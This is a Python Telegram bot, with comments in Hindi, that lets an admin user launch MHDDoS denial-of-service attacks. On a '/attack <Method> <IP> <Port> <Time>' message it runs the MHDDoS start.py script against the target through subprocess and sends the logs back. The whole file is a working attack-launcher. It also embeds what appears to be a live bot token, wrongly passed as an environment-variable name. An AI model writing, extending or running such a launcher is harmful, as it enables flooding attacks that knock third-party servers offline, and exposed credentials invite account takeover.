import telebot
import subprocess
import os

BOT_TOKEN = os.getenv("8980762006:AAFxqz6rAA3bEcgn0pfZBiNArUuvZ2JiIX0")
ADMIN_ID = str(os.getenv("8755017952"))

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "🤖 MHDDoS Bot Ready!\n\nFormat:\n`/attack <Method> <IP> <Port> <Time>`\n\nExample:\n`/attack TCP 192.168.1.1 80 60`")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    # चेक करें कि कमांड सिर्फ Admin भेज रहा है
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "❌ Unauthorized Access!")
        return

    try:
        # मैसेज को स्पेस के हिसाब से तोड़ें
        args = message.text.split()[1:]
        
        # अब सिर्फ 4 आर्गुमेंट्स की जरूरत है
        if len(args) < 4:
            bot.reply_to(message, "⚠️ सही फॉर्मेट: `/attack <Method> <IP> <Port> <Time>`\nउदाहरण: `/attack TCP 192.168.1.1 80 60`")
            return

        # 4 वेरिएबल्स में डेटा निकालें
        method, target, port, duration = args
        
        # Threads को डिफ़ॉल्ट रूप से 100 सेट कर दें (क्योंकि आपने इसे कमांड से हटाया है)
        threads = "100" 

        bot.reply_to(message, f"🚀 अटैक शुरू हो रहा है...\nMethod: {method}\nTarget: {target}\nPort: {port}\nTime: {duration}s")

        # MHDDoS कमांड तैयार करें
        cmd = ["python", "start.py", method, target, port, str(threads), str(duration)]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()

        output = stdout if stdout else stderr
        bot.reply_to(message, f"✅ पूरा हुआ!\nLogs:\n`{output[-3000:]}`", parse_mode='Markdown')

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

bot.polling()
